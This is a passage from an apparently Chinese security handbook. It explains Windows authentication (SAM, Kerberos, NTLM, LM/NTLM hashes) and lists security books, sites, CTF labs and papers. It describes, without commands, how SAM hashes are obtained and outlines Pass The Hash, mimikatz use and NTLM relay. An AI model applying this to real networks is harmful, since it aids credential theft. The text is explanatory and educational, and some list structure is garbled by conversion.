href='https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace.pdf'><span>SSO Wars The Token Menace</span></a></p><ol start='' ><li><h1 id='scram'><span>SCRAM</span></h1><ol start='' ><li><h3 id='简介-43'><span>简介</span></h3></li></ol></li></ol></li></ul><blockquote><p><span>SCRAM (Salted Challenge Response Authentication Mechanism) 是一套包含服务器和客户端双向确认的用户认证机制。</span></p></blockquote><h3 id='参考链接-参考链接-52'><span>参考链接 {#参考链接-52}</span></h3><h4 id='规范-1'><span>规范</span></h4><ul><li><p><a href='https://tools.ietf.org/html/rfc4422'><span>RFC 4422 Simple Authentication and Security Layer (SASL)</span></a></p></li><li><p><a href='https://tools.ietf.org/html/rfc5802'><span>RFC 5802 Salted Challenge Response Authentication Mechanism (SCRAM) SASL and GSS-API Mech-</span></a><span> </span><a href='https://tools.ietf.org/html/rfc5802'><span>anisms</span></a></p></li><li><p><a href='https://tools.ietf.org/html/rfc7677'><span>RFC 7677 SCRAM-SHA-256 and SCRAM-SHA-256-PLUS Simple Authentication and Security Layer</span></a><span> </span><a href='https://tools.ietf.org/html/rfc7677'><span>(SASL) Mechanisms</span></a></p><ol start='' ><li><h2 id='windows-4'><span>Windows</span></h2><ol start='' ><li><h3 id='本地用户认证'><span>本地用户认证</span></h3></li></ol></li></ol></li></ul><blockquote><p><span>Windows 在进行本地登录认证时操作系统会使用用户输入的密码作为凭证去与系统中的密码进行对比验证。通过 winlogon.exe 接收用户输入传递至 lsass.exe 进行认证。</span></p><p><span>winlogon.exe 用于在用户注销、重启、锁屏后显示登录界面。lsass.exe 用于将明文密码变成 NTLM Hash</span></p><p><span>的形式与 SAM 数据库比较认证。</span></p></blockquote><h3 id='sam'><span>SAM</span></h3><blockquote><p><span>安全帐户管理器 (Security Accounts Manager，SAM) 是 Windows 操作系统管理用户帐户的安全所使用的一种机制。用来存储 Windows 操作系统密码的数据库文件为了避免明文密码泄漏 SAM 文件中保存的是明文密码在经过一系列算法处理过的 Hash 值被保存的 Hash 分为 LM Hash、NTLM Hash。当用户进行身份认证时会将输入的 Hash 值与 SAM 文件中保存的 Hash 值进行对比。</span></p><p><span>SAM 文 件 保 存 于 %SystemRoot%</span><span>\</span><span>system32</span><span>\</span><span>config</span><span>\</span><span>sam 中， 在 注 册 表 中 保 存 在</span></p><p><span>HKEY_LOCAL_MACHINE</span><span>\</span><span>SAM</span><span>\</span><span>SAM ，HKEY_LOCAL_MACHINE</span><span>\</span><span>SECURITY</span><span>\</span><span>SAM 。在正常情况下 SAM 文件处</span></p><p><span>于锁定状态不可直接访问、复制、移动仅有 system 用户权限才可以读写该文件。</span></p></blockquote><h3 id='密码破解'><span>密码破解</span></h3><ul><li><span>通 过 物 理 接 触 主 机、 启 动 其 他 操 作 系 统 来 获 取 Windows 分 区 上 的</span></li></ul><p><span>%SystemRoot%</span><span>\</span><span>system32</span><span>\</span><span>config</span><span>\</span><span>sam 文件</span></p><ul><li><p><span>获取 %SystemRoot%</span><span>\</span><span>repair</span><span>\</span><span>sam.</span><span>_</span><span> 文件。</span></p></li><li><p><span>使用工具从注册表中导出 SAM 散列值</span></p></li><li><p><span>从网络中嗅探分析 SMB 报文，从中获取密码散列</span></p><ol start='' ><li><h3 id='spnego'><span>SPNEGO</span></h3></li></ol></li></ul><blockquote><p><span>SPNEGO (SPNEGO: Simple and Protected GSS-API Negotiation) 是微软提供的一种使用 GSS-API 认证机制的安全协议，用于使 Webserver 共享 Windows Credentials，它扩展了 Kerberos。</span></p></blockquote><ol start='' ><li><h2 id='kerberos-1'><span>Kerberos</span></h2><ol start='' ><li><h3 id='简介-44'><span>简介</span></h3></li></ol></li></ol><blockquote><p><span>Kerberos 协议起源于美国麻省理工学院 Athena 项目，基于公私钥加密体制，为分布式环境提供双向验证，在 RFC 1510 中被采纳，Kerberos 是 Windows 域环境中的默认身份验证协议。</span></p><p><span>简单地说，Kerberos 提供了一种单点登录 (Single Sign-On, SSO) 的方法。考虑这样一个场景，在一个网络中有不同的服务器，比如，打印服务器、邮件服务器和文件服务器。这些服务器都有认证的需求。很自然的，不可能让每个服务器自己实现一套认证系统，而是提供一个中心认证服务器 (Authentication Server, AS) 供这些服务器使用。这样任何客户端就只需维护一个密码就能登录所有服务器。</span></p><p><span>Kerberos 协议是一个基于票据 (Ticket) 的系统，在 Kerberos 系统中至少有三个角色：认证服务器 (AS)，客户端 (Client) 和普通服务器 (Server)。</span></p><p><span>认证服务器对用户进行验证，并发行供用户用来请求会话票据的 TGT(票据授予票据)。票据授予服务 (TGS)</span></p><p><span>在发行给客户的 TGT 的基础上，为网络服务发行 ST(会话票据)。</span></p><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>在 Kerberos 系统中，客户端和服务器都有一个唯一的名字，叫做 Principal。同时，客户端和服务器都有自己的密码，并 它们的密码只有自己和认证服务器 AS 知道。</span></p></blockquote><h3 id='基本概念-3'><span>基本概念</span></h3><ul><li><h4 id='principal安全个体'><span>Principal(安全个体)</span></h4><ul><li><span>被认证的个体，有一个名字 (name) 和口令 (password)</span></li></ul></li><li><h4 id='kdc-key-distribution-center'><span>KDC (Key Distribution Center)</span></h4><ul><li><span>提供 ticket 和临时的会话密钥的网络服务</span></li></ul></li><li><h4 id='ticket'><span>Ticket</span></h4><ul><li><span>一个记录，用户可以用它来向服务器证明自己的身份，其中包括用户的标识、会话密钥、时间戳，以及其他一些信息。Ticket 中的大多数信息都被加密，密钥为服务器的密钥</span></li></ul></li><li><h4 id='authenticator'><span>Authenticator</span></h4><ul><li><span>一个记录，其中包含一些最近产生的信息，产生这些信息需要用到用户和服务器之间共享的会话密钥</span></li></ul></li><li><h4 id='credentials'><span>Credentials</span></h4><ul><li><span>一个 ticket 加上一个秘密的会话密钥</span></li></ul></li><li><h4 id='authentication-server-as'><span>Authentication Server (AS)</span></h4><ul><li><span>通过 long-term key 认证用户</span></li><li><span>AS 给予用户 ticket granting ticket 和 short-term key</span></li><li><span>认证服务</span></li></ul></li><li><h4 id='ticket-granting-server-tgs'><span>Ticket Granting Server (TGS)</span></h4><ul><li><p><span>通过 short-term key 和 Ticket Granting Ticket 认证用户</span></p></li><li><p><span>TGS 发放 tickets 给用户以访问其他的服务器</span></p></li><li><p><span>授权和访问控制服务</span></p><ol start='' ><li><h3 id='简化的认证过程'><span>简化的认证过程</span></h3><ol start='' ><li><p><span>客户端向服务器发起请求，请求内容是：客户端的 principal，服务器的 principal</span></p></li><li><h4 id='as-收到请求之后随机生成一个密码-kc-ssession-key-并生成以下两个票据返回给客户端-1'><span>AS 收到请求之后，随机生成一个密码 Kc, s(session key), 并生成以下两个票据返回给客户端</span></h4><ol start='' ><li><p><span>给客户端的票据，用客户端的密码加密，内容为随机密码，session，server_principal</span></p></li><li><p><span>给服务器端的票据，用服务器的密码加密，内容为随机密码，session，client_principal</span></p></li><li><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据，得到 Kc、s，然后生成一个 Au- thenticator，其中主要包括当前时间和 Ts,c 的校验码，并 用 SessionKey Kc,s 加密。之后客户端将 Authenticator 和给 server 的票据同时发给服务器</span></p></li><li><h4 id='服务器首先用自己的密码解开票据拿到-sessionkey-kcs然后用-kcs-解开-authenticator并做如下检查'><span>服务器首先用自己的密码解开票据，拿到 SessionKey Kc,s，然后用 Kc,s 解开 Authenticator，并做如下检查</span></h4><ol start='' ><li><img src="media/image1.png" referrerpolicy="no-referrer"><span>检查 Authenticator 中的时间戳是不是在当前时间上下 5 分钟以内，并 检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行 Replay 攻击。</span></li><li><span>检查 checksum 是否正确</span></li><li><span>如果都正确，客户端就通过了认证</span></li></ol></li><li><p><span>服务器段可选择性地给客户端回复一条消息来完成双向认证，内容为用 session key 加密的时间戳</span></p></li><li><p><span>客户端通过解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器</span></p></li></ol></li></ol></li><li><h3 id='完整的认证过程'><span>完整的认证过程</span></h3></li></ol></li></ul></li></ul><blockquote><p><span>上方介绍的流程已经能够完成客户端和服务器的相互认证。但是，比较不方便的是每次认证都需要客户端输入自己的密码。</span></p><p><span>因此在 Kerberos 系统中，引入了一个新的角色叫做：票据授权服务 (TGS - Ticket Granting Service)，它的地位类似于一个普通的服务器，只是它提供的服务是为客户端发放用于和其他服务器认证的票据。</span></p><p><span>这样，Kerberos 系统中就有四个角色：认证服务器 (AS)，客户端 (Client)，普通服务器 (Server) 和票据授权服务 (TGS)。这样客户端初次和服务器通信的认证流程分成了以下 6 个步骤：</span></p></blockquote><ol start='' ><li><p><span>客户端向 AS 发起请求，请求内容是：客户端的 principal，票据授权服务器的 rincipal</span></p></li><li><h4 id='as-收到请求之后随机生成一个密码-kc-ssession-key-并生成以下两个票据返回给客户端-2'><span>AS 收到请求之后，随机生成一个密码 Kc, s(session key), 并生成以下两个票据返回给客户端：</span></h4><ol start='' ><li><p><span>给客户端的票据，用客户端的密码加密，内容为随机密码，session，tgs_principal</span></p></li><li><p><span>给 tgs 的票据，用 tgs 的密码加密，内容为随机密码，session，client_principal</span></p></li><li><h4 id='客户端拿到了第二步中的两个票据后首先用自己的密码解开票据得到-kcs然后生成一个-authenticator'><span>客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据，得到 Kc、s，然后生成一个 Authenticator</span></h4><ol start='' ><li><p><span>Authenticator</span></p></li><li><p><span>给 tgs 的票据同时发给服务器</span></p></li><li><p><span>server_principal</span></p></li><li><h4 id='tgs-首先用自己的密码解开票据拿到-sessionkey-kcs然后用-kcs-解开-authenticator并做如下检查'><span>TGS 首先用自己的密码解开票据，拿到 SessionKey Kc,s，然后用 Kc,s 解开 Authenticator，并做如下检查</span></h4><ol start='' ><li><img src="media/image1.png" referrerpolicy="no-referrer"><span>检查 Authenticator 中的时间戳是不是在当前时间上下 5 分钟以内，并 检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行 Replay 攻击。</span></li><li><span>检查 checksum 是否正确</span></li><li><span>如果都正确，客户端就通过了认证</span></li></ol></li><li><h4 id='tgs-生成一个-session-key-组装两个票据给客户端'><span>tgs 生成一个 session key 组装两个票据给客户端</span></h4><ol start='' ><li><span>用客户端和 tgs 的 session key 加密的票据，包含新生成的 session key 和 server_principal</span></li><li><span>用服务器的密码加密的票据，包括新生成的 session key 和 client principal</span></li></ol></li><li><h4 id='客户端收到两个票据后解开自己的然后生成一个-authenticator发请求给服务器内容包括'><span>客户端收到两个票据后，解开自己的，然后生成一个 Authenticator，发请求给服务器，内容包括</span></h4><ol start='' ><li><span>Authenticator</span></li><li><span>给服务器的票据</span></li></ol></li><li><p><span>服务器收到请求后，用自己的密码解开票据，得到 session key，然后用 session key 解开 authenticator</span></p></li></ol></li></ol></li></ol><blockquote><p><span>对可无端进行验证</span></p></blockquote><ol start='8' ><li><span>服务器可以选择返回一个用 session key 加密的之前的是时间戳来完成双向验证</span></li><li><span>客户端通过解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器</span></li></ol><h3 id='优缺点'><span>优缺点</span></h3><h4 id='优点'><span>优点</span></h4><ul><li><span>密码不易被窃听</span></li><li><span>密码不在网上传输</span></li><li><span>密码猜测更困难</span></li><li><span>票据被盗之后难以使用，因为需要配合认证头来使用</span></li></ul><h4 id='缺点'><span>缺点</span></h4><ul><li><p><span>缺乏撤销机制</span></p></li><li><p><span>引入了复杂的密钥管理</span></p></li><li><p><span>需要时钟同步</span></p></li><li><p><span>伸缩性受限</span></p><ol start='' ><li><h3 id='参考链接-参考链接-53'><span>参考链接 {#参考链接-53}</span></h3></li></ol></li></ul><h4 id='规范-2'><span>规范</span></h4><ul><li><a href='https://tools.ietf.org/html/rfc1510'><span>RFC 1510 The Kerberos Network Authentication Service</span></a></li><li><a href='https://blog.csdn.net/jewes/article/details/20792021'><span>Kerberos 认证流程详解</span></a></li></ul><h4 id='攻击-2'><span>攻击</span></h4><ul><li><p><a href='https://www.blackhat.com/docs/asia-17/materials/asia-17-Hart-Delegate-To-The-Top-Abusing-Kerberos-For-Arbitrary-Impersonations-And-RCE-wp.pdf'><span>Delegate to the Top: Abusing Kerberos for arbitrary impersonations and RCE</span></a></p></li><li><p><a href='https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94?redirectedfrom=MSDN'><span>Kerberos Protocol Extensions: Service for User and Constrained Delegation Protocol</span></a></p></li><li><p><a href='https://docs.microsoft.com/en-us/previous-versions/msp-n-p/ff649429(v%3Dpandp.10)'><span>Kerberos Technical Supplement for Windows</span></a></p></li><li><p><a href='https://adsecurity.org/?p=2293'><span>Cracking Kerberos TGS Tickets Using Kerberoast </span>–<span> Exploiting Kerberos to Compromise the Active</span></a><span> </span><a href='https://adsecurity.org/?p=2293'><span>Directory Domain</span></a></p><ol start='' ><li><h2 id='ntlm-身份验证'><span>NTLM 身份验证</span></h2><ol start='' ><li><h3 id='ntlm-认证'><span>NTLM 认证</span></h3></li></ol></li></ol></li></ul><blockquote><p><span>NTLM 是 NT LAN Manager 的缩写，NTLM 是基于挑战/应答的身份验证协议，是 Windows NT 早期版本中的标准安全协议。</span></p></blockquote><h4 id='基本流程'><span>基本流程</span></h4><ul><li><span>客户端在本地加密当前用户的密码成为密码散列</span></li><li><span>客户端向服务器明文发送账号</span></li><li><span>服务器端产生一个 16 位的随机数字发送给客户端，作为一个 challenge</span></li><li><span>客户端用加密后的密码散列来加密 challenge，然后返回给服务器，作为 response</span></li><li><span>服务器端将用户名、challenge、response 发送给域控制器</span></li><li><span>域控制器用这个用户名在 SAM 密码管理库中找到这个用户的密码散列，然后使用这个密码散列来加密 chellenge</span></li><li><span>域控制器比较两次加密的 challenge，如果一样那么认证成功，反之认证失败</span></li></ul><h4 id='net-ntlmv1'><span>Net-NTLMv1</span></h4><blockquote><p><span>Net-NTLMv1 协议的基本流程如下：</span></p></blockquote><ul><li><span>客户端向服务器发送一个请求</span></li><li><span>服务器接收到请求后，生成一个 8 位的 Challenge，发送回客户端</span></li><li><span>客户端接收到 Challenge 后，使用登录用户的密码 hash 对 Challenge 加密，作为 response 发送给服务器</span></li><li><span>服务器校验 response</span></li></ul><blockquote><p><span>Net-NTLMv1 response 的计算方法为</span></p></blockquote><ul><li><span>将用户的 NTLM hash 补零至 21 字节分成三组 7 字节数据</span></li><li><span>三组数据作为 3DES 加密算法的三组密钥，加密 Server 发来的 Challenge</span></li></ul><blockquote><p><span>这种方式相对脆弱，可以基于抓包工具和彩虹表爆破工具进行破解。</span></p></blockquote><h4 id='net-ntlmv2'><span>Net-NTLMv2</span></h4><blockquote><p><span>自 Windows Vista 起，微软默认使用 Net-NTLMv2 协议，其基本流程如下：</span></p></blockquote><ul><li><p><span>客户端向服务器发送一个请求</span></p></li><li><p><span>服务器接收到请求后，生成一个 16 位的 Challenge，发送回客户端</span></p></li><li><p><span>客户端接收到 Challenge 后，使用登录用户的密码 hash 对 Challenge 加密，作为 response 发送给服务器</span></p></li><li><p><span>服务器校验 response</span></p><ol start='' ><li><h3 id='hash-2'><span>Hash</span></h3></li></ol></li></ul><h4 id='lm-hash'><span>LM Hash</span></h4><blockquote><p><img src="media/image1.png" referrerpolicy="no-referrer"><span>LM Hash(LAN Manager Hash) 是 windows 最早用的加密算法，由 IBM 设计。LM Hash 使用硬编码秘钥的 DES， 存在缺陷。早期的 Windows 系统如 XP、Server 2003 等使用 LM Hash，而后的系统默认禁用了 LM Hash 并使用 NTLM Hash。</span></p><p><span>LM Hash 的计算方式为：</span></p></blockquote><ul><li><span>转换用户的密码为大写，14 字节截断</span></li><li><span>不足 14 字节则需要在其后添加 0×00 补足</span></li><li><span>将 14 字节分为两段 7 字节的密码</span></li><li><span>以 KGS!@#</span><span>$</span><span>% 作为秘钥对这两组数据进行 DES 加密，得到 16 字节的哈希</span></li><li><span>拼接后得到最后的 LM Hash。</span></li></ul><blockquote><p><span>作为早期的算法，LM Hash 存在着诸多问题：</span></p></blockquote><ul><li><img src="media/image1.png" referrerpolicy="no-referrer"><span>密码长度不会超过 14 字符， 不区分大小写</span></li><li><span>如果密码长度小于 7 位，后一组哈希的值确定，可以通过结尾为 aad3b435b51404ee 来判断密码长度不超过 7 位</span></li><li><span>分组加密极大程度降低了密码的复杂度</span></li><li><span>DES 算法强度低</span></li></ul><h4 id='ntlm-hash'><span>NTLM Hash</span></h4><blockquote><p><span>为了解决 LM Hash 的安全问题，微软于 1993 年在 Windows NT 3.1 中引入了 NTLM 协议。</span></p><p><span>Windows 2000 / XP / 2003 在密码超过 14 位前使用 LM Hash，在密码超过 14 位后使用 NTLM Hash。而之后从 Vista 开始的版本都使用 NTLM Hash。</span></p><p><span>NTLM Hash 的计算方法为：</span></p></blockquote><ul><li><p><span>将密码转换为 16 进制，进行 Unicode 编码</span></p></li><li><p><span>基于 MD4 计算哈希值</span></p><ol start='' ><li><h3 id='攻击-3'><span>攻击</span></h3></li></ol></li></ul><h4 id='pass-the-hash'><span>Pass The Hash</span></h4><blockquote><p><span>Pass The Hash (PtH) 是攻击者捕获帐号登录凭证后，复用凭证 Hash 进行攻击的方式。</span></p><p><span>微软在 2012 年 12 月发布了针对 Pass The Hash 攻击的防御指导，文章中提到了一些防御方法，并说明了为什么不针对 Pass The Hash 提供更新补丁。</span></p></blockquote><h4 id='pass-the-key'><span>Pass The Key</span></h4><blockquote><p><span>在禁用 NTLM 的环境下，可以用 mimikatz 等工具直接获取密码。</span></p></blockquote><h4 id='ntlm-relay'><span>NTLM Relay</span></h4><blockquote><p><span>攻击者可以一定程度控制客户端网络的时候，可以使用中间人攻击的方式来获取权限。对客户端伪装为身份验证服务器，对服务端伪装为需要认证的客户端。</span></p></blockquote><h3 id='参考链接-参考链接-54'><span>参考链接 {#参考链接-54}</span></h3><ul><li><a href='https://www.freebuf.com/articles/system/224171.html'><span>Windows 身份认证及利用思路</span></a></li><li><a href='http://davenport.sourceforge.net/ntlm.html'><span>The NTLM Authentication Protocol and Security Support Provider</span></a></li></ul><p><span>CHAPTER 10</span></p><p><span>工具与资源</span></p><ol start='' ><li><h2 id='推荐资源'><span>推荐资源</span></h2><ol start='' ><li><h3 id='书单'><span>书单</span></h3></li></ol></li></ol><h4 id='前端'><span>前端</span></h4><ul><li><span>Web 之困</span></li><li><span>白帽子讲 Web 安全</span></li><li><span>白帽子讲浏览器安全（钱文祥）</span></li><li><span>Web 前端黑客技术揭秘</span></li><li><span>XSS 跨站脚本攻击剖析与防御</span></li><li><span>SQL 注入攻击与防御</span></li></ul><h4 id='网络-2'><span>网络</span></h4><ul><li><span>Understanding linux network internals</span></li><li><span>TCP/IP Architecture, Design, and Implementation in Linux</span></li><li><span>Linux Kernel Networking: Implementation and Theory</span></li><li><span>Bulletproof SSL and TLS</span></li></ul><h4 id='323'><span>323</span></h4><ul><li><span>UNIX Network Programming</span></li><li><span>TCP / IP 协议详解</span></li></ul><h4 id='seo'><span>SEO</span></h4><ul><li><span>SEO 艺术</span></li></ul><h4 id='无线攻防'><span>无线攻防</span></h4><ul><li><span>无线网络安全攻防实战</span></li><li><span>无线网络安全攻防实战进阶</span></li><li><span>黑客大揭秘</span>–––<span>近源渗透测试（柴坤哲等）</span></li></ul><h4 id='hacking-programming'><span>Hacking Programming</span></h4><ul><li><span>Gray Hat Python</span></li></ul><h4 id='社会工程学-1'><span>社会工程学</span></h4><ul><li><span>社会工程：安全体系中的人性漏洞</span></li><li><span>反欺骗的艺术</span></li><li><span>反入侵的艺术</span></li></ul><h4 id='数据安全'><span>数据安全</span></h4><ul><li><span>大数据治理与安全从理论到开源实践（刘驰等）</span></li><li><span>企业大数据处理 Spark、Druid、Flume 与 Kafka 应用实践（肖冠宇）</span></li><li><span>数据安全架构设计与实战（郑云文）</span></li></ul><h4 id='机器学习与网络安全'><span>机器学习与网络安全</span></h4><ul><li><span>Web 安全深度学习实战（刘焱）</span></li><li><span>Web 安全机器学习入门（刘焱）</span></li><li><span>Web 安全之强化学习与 GAN（刘焱）</span></li><li><span>AI 安全之对抗样本入门（兜哥）</span></li></ul><h4 id='安全建设-2'><span>安全建设</span></h4><ul><li><span>企业安全建设入门</span>–––<span>基于开源软件打造企业网络安全（刘焱）</span></li><li><span>企业安全建设指南</span>–––<span>金融行业安全架构与技术实践（聂君等）</span></li><li><span>大型互联网企业安全架构（石祖文）</span></li><li><span>CISSP 官方学习指南</span></li><li><span>CISSP 认证考试指南</span></li><li><span>Linux 系统安全纵深防御、安全扫描与入侵检测（胥峰）</span></li></ul><h4 id='综合-2'><span>综合</span></h4><ul><li><span>Web 安全深度剖析</span></li><li><span>黑客秘笈</span>–––<span>渗透测试实用指南</span></li><li><span>黑客攻防技术宝典</span>–––<span>web 实战篇</span></li></ul><h4 id='法律'><span>法律</span></h4><ul><li><span>信息安全标准和法律法规（第二版）（注：武汉大学出版社）</span></li></ul><ol start='2' ><li><h3 id='website'><span>WebSite</span></h3><ul><li><a href='https://adsecurity.org/' target='_blank' class='url'>https://adsecurity.org/</a></li></ul></li><li><h3 id='blog-4'><span>Blog</span></h3><ul><li><a href='https://www.leavesongs.com/' target='_blank' class='url'>https://www.leavesongs.com/</a></li><li><a href='https://paper.seebug.org/' target='_blank' class='url'>https://paper.seebug.org/</a></li><li><a href='https://xz.aliyun.com/' target='_blank' class='url'>https://xz.aliyun.com/</a></li><li><a href='https://portswigger.net/blog' target='_blank' class='url'>https://portswigger.net/blog</a></li><li><a href='https://www.hackerone.com/blog' target='_blank' class='url'>https://www.hackerone.com/blog</a></li></ul></li><li><h3 id='bug-bounty'><span>Bug Bounty</span></h3><ul><li><a href='https://www.hackerone.com/' target='_blank' class='url'>https://www.hackerone.com/</a></li><li><a href='https://bugcrowd.com/'><span>https://bugcrowd.com</span></a></li><li><a href='https://www.synack.com/' target='_blank' class='url'>https://www.synack.com/</a></li></ul></li></ol><p>&nbsp;</p><ol start='' ><li><h4 id='推荐资源-325'><span>推荐资源 325</span></h4><ul><li><a href='https://cobalt.io/' target='_blank' class='url'>https://cobalt.io/</a></li></ul><ol start='' ><li><h3 id='实验环境'><span>实验环境</span></h3></li></ol></li></ol><h4 id='web-安全相关-ctf-题目'><span>Web 安全相关 CTF 题目</span></h4><ul><li><a href='https://github.com/orangetw/My-CTF-Web-Challenges' target='_blank' class='url'>https://github.com/orangetw/My-CTF-Web-Challenges</a></li><li><a href='https://www.ripstech.com/php-security-calendar-2017/' target='_blank' class='url'>https://www.ripstech.com/php-security-calendar-2017/</a></li><li><a href='https://github.com/wonderkun/CTF_web' target='_blank' class='url'>https://github.com/wonderkun/CTF_web</a></li><li><a href='https://github.com/CHYbeta/Code-Audit-Challenges' target='_blank' class='url'>https://github.com/CHYbeta/Code-Audit-Challenges</a></li><li><a href='https://github.com/l4wio/CTF-challenges-by-me' target='_blank' class='url'>https://github.com/l4wio/CTF-challenges-by-me</a></li><li><a href='https://github.com/tsug0d/MyAwesomeWebChallenge' target='_blank' class='url'>https://github.com/tsug0d/MyAwesomeWebChallenge</a></li><li><a href='https://github.com/a0xnirudh/kurukshetra' target='_blank' class='url'>https://github.com/a0xnirudh/kurukshetra</a></li><li><a href='http://www.xssed.com/' target='_blank' class='url'>http://www.xssed.com/</a></li></ul><h4 id='域实验环境'><span>域实验环境</span></h4><ul><li><a href='https://github.com/christophetd/Adaz'><span>Adaz</span></a><span>: Active Directory Hunting Lab in Azure</span></li><li><a href='https://github.com/clong/DetectionLab'><span>Detection</span></a><span> Vagrant &amp; Packer scripts to build a lab environment complete with security tooling and logging best practices</span></li></ul><h3 id='知识库'><span>知识库</span></h3><h4 id='awesome-系列'><span>Awesome 系列</span></h4><ul><li><a href='https://github.com/zer0yu/Awesome-CobaltStrike'><span>Awesome CobaltStrike</span></a></li><li><a href='https://github.com/fabacab/awesome-cybersecurity-blueteam'><span>Awesome Cybersecurity Blue Team</span></a></li><li><a href='https://github.com/Hack-with-Github/Awesome-Hacking'><span>Awesome Hacking</span></a></li><li><a href='https://github.com/PaulSec/awesome-sec-talks'><span>awesome sec talks</span></a></li><li><a href='https://github.com/sbilly/awesome-security'><span>Awesome Security</span></a></li><li><a href='https://github.com/qazbnm456/awesome-web-security'><span>awesome web security</span></a></li><li><a href='https://github.com/saeidshirazi/awesome-android-security'><span>Awesome-Android-Security</span></a></li></ul><h4 id='bug-hunting'><span>Bug Hunting</span></h4><ul><li><a href='https://github.com/KathanP19/HowToHunt'><span>HowToHunt</span></a><span> Tutorials and Things to Do while Hunting Vulnerability</span></li></ul><h4 id='java-3'><span>Java</span></h4><ul><li><a href='https://github.com/threedr3am/learnjavabug'><span>learnjavabug</span></a><span> Java 安全相关的漏洞和技术 demo</span></li></ul><h4 id='红蓝对抗-2'><span>红蓝对抗</span></h4><ul><li><a href='https://github.com/redcanaryco/atomic-red-team'><span>atomic red team</span></a><span> Small and highly portable detection tests based on MITRE</span>’<span>s ATT&amp;CK</span></li></ul><h4 id='后渗透'><span>后渗透</span></h4><ul><li><a href='https://github.com/rootclay/Powershell-Attack-Guide.git'><span>Powershell 攻击指南黑客后渗透之道</span></a></li><li><a href='https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet'><span>Active Directory Exploitation Cheat Sheet</span></a></li></ul><ol start='2' ><li><h2 id='相关论文'><span>相关论文</span></h2><ol start='' ><li><h3 id='论文列表'><span>论文列表</span></h3><ul><li><a href='https://github.com/techge/PRE-list'><span>PRE-list</span></a><span> List of (automatic) protocol reverse engineering tools for network protocols</span></li></ul></li><li><h3 id='流量分析'><span>流量分析</span></h3><ul><li><span>Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware</span><span>[</span><span>C</span><span>]</span><span>//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278.</span></li><li><span>Nasr M, Houmansadr A, Mazumdar A. Compressive traffic analysis: A new paradigm for scalable traffic analysis</span><span>[</span><span>C</span><span>]</span><span>//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 2053-2069.</span></li></ul></li><li><h3 id='漏洞自动化'><span>漏洞自动化</span></h3><ul><li><span>Staicu C A, Pradel M, Livshits B. SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE. JS</span><span>[</span><span>C</span><span>]</span><span>//NDSS. 2018.</span></li><li><span>Atlidakis V , Godefroid P , Polishchuk M . REST-ler: Automatic Intelligent REST API Fuzzing</span><span>[</span><span>J</span><span>]</span><span>. 2018.</span></li><li><span>Alhuzali A, Gjomemo R, Eshete B, et al. {NAVEX}: Precise and Scalable Exploit Generation for Dynamic Web Applications</span><span>[</span><span>C</span><span>]</span><span>//27th {USENIX} Security Symposium ({USENIX} Security 18). 2018: 377-392.</span></li></ul></li></ol></li></ol><p>&nbsp;</p><ol start='2' ><li><p><strong><span>相关论文</span></strong><span> </span><strong><span>327</span></strong></p><ol start='' ><li><h3 id='攻击技巧'><span>攻击技巧</span></h3><ul><li><span>Lekies S, Kotowicz K, Groß S, et al. Code-reuse attacks for the web: Breaking cross-site scripting mitigations via script gadgets</span><span>[</span><span>C</span><span>]</span><span>//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 1709-1723.</span></li><li><span>Papadopoulos P, Ilia P, Polychronakis M, et al. Master of Web Puppets: Abusing Web Browsers for Persistent and Stealthy Computation</span><span>[</span><span>J</span><span>]</span><span>. arXiv preprint arXiv:1810.00464, 2018.</span></li></ul></li><li><h3 id='攻击检测'><span>攻击检测</span></h3><ul><li><span>Liu T, Qi Y, Shi L, et al. Locate-then-detect: real-time web attack detection via attention-based deep neural networks</span><span>[</span><span>C</span><span>]</span><span>//Proceedings of the 28th International Joint Conference on Artificial Intelligence. AAAI Press, 2019: 4725-4731.</span></li></ul></li><li><h3 id='隐私'><span>隐私</span></h3><ul><li><span>Klein A, Pinkas B. DNS Cache-Based User Tracking</span><span>[</span><span>C</span><span>]</span><span>//NDSS. 2019.</span></li></ul></li><li><h3 id='指纹-1'><span>指纹</span></h3><ul><li><span>Hayes J, Danezis G. k-fingerprinting: A robust scalable website fingerprinting technique</span><span>[</span><span>C</span><span>]</span><span>//25th</span></li></ul></li></ol></li></ol><blockquote><p><span>{USENIX} Security Symposium ({USENIX} Security 16). 2016: 1187-1203.</span></p></blockquote><ul><li><span>Overdorf R, Juarez M, Acar G, et al. How unique is your. onion?: An analysis of the fingerprint- ability of tor onion services</span><span>[</span><span>C</span><span>]</span><span>//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 2021-2036.</span></li></ul><ol start='5' ><li><h3 id='侧信道-1'><span>侧信道</span></h3><ul><li><span>Rosner N, Kadron I B, Bang L, et al. Profit: Detecting and Quantifying Side Channels in Networked Applications</span><span>[</span><span>C</span><span>]</span><span>//NDSS. 2019.</span></li></ul></li><li><h3 id='认证-1'><span>认证</span></h3><ul><li><span>Ghasemisharif M, Ramesh A, Checkoway S, et al. O single sign-off, where art thou? an empirical analysis of single sign-on account hijacking and session management on the web</span><span>[</span><span>C</span><span>]</span><span>//27th {USENIX} Security Symposium ({USENIX} Security 18). 2018: 1475-1492.</span></li></ul></li><li><h3 id='防护'><span>防护</span></h3><ul><li><span>Pellegrino G, Johns M, Koch S, et al. Deemon: Detecting CSRF with dynamic analysis and property graphs</span><span>[</span><span>C</span><span>]</span><span>//Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2017: 1757-1771.</span></li></ul></li></ol><p>&nbsp;</p><ol start='3' ><li><h2 id='信息收集-信息收集-3'><span>信息收集 